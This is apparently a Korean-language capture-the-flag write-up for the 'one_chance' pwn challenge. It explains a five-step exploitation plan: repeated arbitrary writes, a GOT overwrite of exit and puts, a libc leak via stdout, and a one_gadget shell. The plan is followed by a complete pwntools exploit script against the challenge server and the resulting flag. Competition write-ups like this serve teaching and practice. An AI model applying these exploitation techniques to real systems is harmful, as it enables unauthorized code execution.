```bash
[*] '/mnt/d/hk/_contest/2024JBU-CTF/one_chance/challenge'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    Stripped:   No
```
Partial RELRO이고, pie가 꺼져있다.

```bash
0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL || {[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...} is a valid argv

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL || {[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...} is a valid argv

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv
```
원가젯이 전부 rsp와만 관련이 되어있다.

malloc, free, show를 한 번씩 시키고, give_chance에서 AAW를 한 번 시켜주고, malloc, free 횟수를 0으로 초기화해준다. give_chance는 실행 횟수(x)=1일 때 접근하면 exit이 실행된다.(give_chance는 i = j = z = 1일 때 실행된다.)

1. 첫 번째 AAW에서 x를 2로 바꾸면 아무리 많이 x가 증가해도 x != 1이므로 give_chance를 무한히 실행할 수 있다.
2. 두 번째 AAW에서 exit_got을 malloc_got으로 바꾸면, exit이 실행되지 않아서 무한정으로 malloc과 free, show가 가능해진다.
3. 세 번째 AAW에서 &(one_chance)\[4\]에 &stdout@@GLIBC_2_2_5 주소를 넣는다.
4. 네 번째 AAW에서 z=0으로 바꾼다.
   3번에서 세팅했으므로 show(4)를 통해 stdout 주소를 알아내고 libc_base를 구할 수 있다. show를 실행했으므로 z=1이 된다.
5. 다섯 번째 AAW에서 각종 함수 실행, 어떤 got을 덮을지, 어떤 원가젯을 사용할지를 손수 노가다하여 쉘이 실행되는 것을 찾는다. 필자는 puts_got을 0xf03a4 원가젯으로 덮어 main에서 puts가 실행될 때 쉘이 따졌다.

# Exploit code

```python
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

p = remote('44.210.9.208', 10018)
# p = process('./challenge')
e = ELF('./challenge')
l = ELF('./libc.so.6')

#gdb.attach(p)

i = 0x60209C
x = 0x6020A8
z = 0x6020A4
main = 0x400B0D
bss = 0x6020C8

def malloc(msg: bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b'Content: ', msg)

def free(idx: int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'>', str(idx).encode())
    
def show(idx: int):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Which chunk do you want to watch?', str(idx).encode())
    p.recvline()
    return p.recvline()[:-1]

def re_chance(i1: int, i2: int):
    p.sendlineafter(b'write your name.', str(i1).encode())
    p.sendlineafter(b'show your efforts.', str(i2).encode())

malloc(b'a')
free(0)
show(0)
re_chance(x, 2)

malloc(b'a')
free(0)
re_chance(e.got['exit'], e.sym['malloc'])

malloc(b'a')
free(0)
re_chance(0x6020e0, 0x602080)

malloc(b'a')
free(0)
re_chance(z, 0)

l.address = u64(show(4).ljust(8, b'\x00')) - l.sym['_IO_2_1_stdout_']
print(hex(l.address))

og = 0xf03a4

malloc(b'a')
free(0)
re_chance(e.got['puts'], l.address + og)
p.interactive()
```
`scpCTF{1_T1M3_0nly@0pp0rtunity!}`